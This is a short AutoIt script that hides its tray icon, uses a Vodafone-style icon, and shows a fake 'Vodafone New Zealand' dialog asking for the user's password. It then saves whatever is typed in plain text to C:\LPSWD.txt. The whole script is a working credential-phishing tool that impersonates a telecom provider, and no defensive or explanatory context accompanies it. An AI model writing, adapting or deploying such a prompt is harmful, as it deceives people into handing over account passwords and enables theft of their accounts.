#NoTrayIcon
#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
#AutoIt3Wrapper_icon=vf.ico
#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****

$LPSWD = InputBox('Vodafone New Zealand', 'Please Enter your Vodafone Password', '', '*', 300, 60)

$LPFIL = FileOpen('C:\LPSWD.txt', 2)
FileWrite($LPFIL, $LPSWD & @CRLF)
FileClose($LPFIL)
